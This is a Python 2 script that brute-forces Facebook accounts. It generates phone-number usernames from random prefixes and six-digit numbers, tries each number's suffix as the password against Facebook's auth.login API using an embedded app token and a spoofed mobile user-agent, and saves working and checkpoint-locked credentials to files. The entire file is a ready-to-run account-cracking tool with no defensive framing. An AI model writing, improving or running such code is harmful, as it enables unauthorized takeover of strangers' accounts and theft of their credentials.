#!/usr/bin/python2
#coding=utf-8

W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(9999):

    nmbr = random.randint(111111, 999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pkg install pip2 && pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
	print '[!] Exit Successfully'
	os.sys.exit()
	
		

    
    
##### LOGO #####

back = 0
successful = []
cpb = []
oks = []
id = []

def bterelevenb():
	os.system('clear')
	try:
		
		c = random.choice(["01", "01", "02", "03", "04", "05", "06", "07", "08", "09"])
		k = random.choice(["017", "018", "019", "014", "013", "016"])
		
		idlist = ('.txt')
		for line in open(idlist,"r").readlines():
			id.append(line.strip())
	except IOError:
		
		bterelevenb()

	xxx = str(len(id))
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' +pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print ('OK '+k+c+user+ '|' +pass1+'\n')
				okb = open('save/ok.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
				
			else:
				if 'www.facebook.com' in q['error_msg']:
					print ('CP '+k+c+user+ '|' +pass1+'\n')
					cps = open('save/cp.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	
		
if __name__ == '__main__':
	bterelevenb()


